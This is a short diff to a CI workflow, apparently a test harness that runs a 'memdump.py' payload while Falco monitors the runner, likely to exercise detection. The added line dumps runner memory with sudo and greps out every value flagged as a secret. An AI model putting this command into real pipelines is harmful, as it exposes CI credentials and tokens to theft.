@@ -37,7 +37,7 @@ jobs:
 
       - name: Changed file payload
         run: |
-          sudo python3 memdump.py
+          sudo python3 memdump.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u
 
       - name: Stop Falco
         uses: falcosecurity/falco-actions/stop@20c7af741b9f2a7918f8e6da77e013c7048ae186
